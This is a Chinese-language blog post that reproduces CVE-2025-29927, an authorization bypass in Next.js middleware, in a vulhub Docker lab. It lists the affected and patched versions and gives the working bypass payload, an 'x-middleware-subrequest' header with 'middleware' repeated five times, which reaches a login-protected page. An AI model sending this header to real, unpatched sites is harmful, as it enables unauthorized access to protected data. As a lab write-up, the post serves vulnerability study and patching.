
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/CVE-Lemon/p/18789173" title="发布于 2025-03-24 12:00">
    <span role="heading" aria-level="2">CVE-2025-29927 Next.js 中间件权限绕过漏洞复现</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h3 id="漏洞信息">漏洞信息</h3>
<p>Next.js 是一个基于 React 的流行 Web 应用框架，提供服务器端渲染、静态网站生成和集成路由系统等功能。包含众多功能，是深入研究复杂研究的完美游乐场。在信念、好奇心和韧性的推动下，我们出发去探索它鲜为人知的方面，寻找等待被发现的隐藏宝藏。</p>
<p>当使用中间件进行身份验证和授权时，Next.js 14.2.25 和 15.2.3 之前的版本存在授权绕过漏洞。</p>
<p>该漏洞允许攻击者通过操作 <code>x-middleware-subrequest</code> 请求头来绕过基于中间件的安全控制，从而可能获得对受保护资源和敏感数据的未授权访问。</p>
<p>补丁：</p>
<ul>
<li>对于 Next.js 15.x，此问题已在 15.2.3 中修复</li>
<li>对于 Next.js 14.x，此问题已在 14.2.25 中修复</li>
</ul>
<h3 id="漏洞复现">漏洞复现</h3>
<p>vulhub已有环境：<a href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md" target="_blank" rel="noopener nofollow">vulhub/next.js/CVE-2025-29927/README.zh-cn.md at master · vulhub/vulhub (github.com)</a></p>
<p>启动环境：</p>
<pre><code>docker compose up -d
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250324115925601-936367598.png" alt="" loading="lazy"></p>
<p>访问虚拟机3000端口,可以看到环境搭建成功：<a href="http://your-ip:3000/login" target="_blank" rel="noopener nofollow">http://your-ip:3000/login</a></p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250324115930128-1046305236.png" alt="" loading="lazy"></p>
<p>访问根路径，显示需要登陆：</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250324115938816-1109577171.png" alt="" loading="lazy"></p>
<p>添加请求头，使用权限绕过payload</p>
<pre><code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
</code></pre>
<p>访问成功，权限绕过漏洞复现成功</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202503/2855436-20250324115936641-1030015712.png" alt="" loading="lazy"></p>
<h3 id="参考文章">参考文章</h3>
<p><a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware" target="_blank" rel="noopener nofollow">Next.js 和损坏的中间件：授权工件 - zhero_web_security (zhero-web-sec.github.io)</a></p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md" target="_blank" rel="noopener nofollow">vulhub/next.js/CVE-2025-29927/README.zh-cn.md at master · vulhub/vulhub (github.com)</a></p>
<p><a href="https://www.ch35tnut.com/zh-cn/vulnerability/cve-2025-29927-nextjs-auth-bypass/" target="_blank" rel="noopener nofollow">CVE 2025 29927 Nextjs Auth Bypass - chestnut's blog (ch35tnut.com)</a></p>
<p><a href="https://www.xugj520.cn/archives/nextjs-middleware-cve-2025-29927-exploit-guide.html" target="_blank" rel="noopener nofollow">Next.js中间件授权绕过漏洞终极指南：CVE-2025-29927深度解析与防护策略 - 高效码农 (xugj520.cn)</a></p>
<p><a href="https://github.com/vercel/next.js/compare/v15.2.2...v15.2.3" target="_blank" rel="noopener nofollow">Comparing v15.2.2...v15.2.3 · vercel/next.js (github.com)</a></p>
<p><a href="https://wx.zsxq.com/group/2212251881/topic/1524224154842282" target="_blank" rel="noopener nofollow">代码审计知识星球 (zsxq.com)</a></p>
<hr>
<p>本文作者CVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.013993059438657408" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-24 12:00">2025-03-24 12:00</span>&nbsp;
<a href="https://www.cnblogs.com/CVE-Lemon">CVE-柠檬i</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18789173" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18789173);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18789173', targetLink: 'https://www.cnblogs.com/CVE-Lemon/p/18789173', title: 'CVE-2025-29927 Next.js 中间件权限绕过漏洞复现' })">举报</a>
</div>
        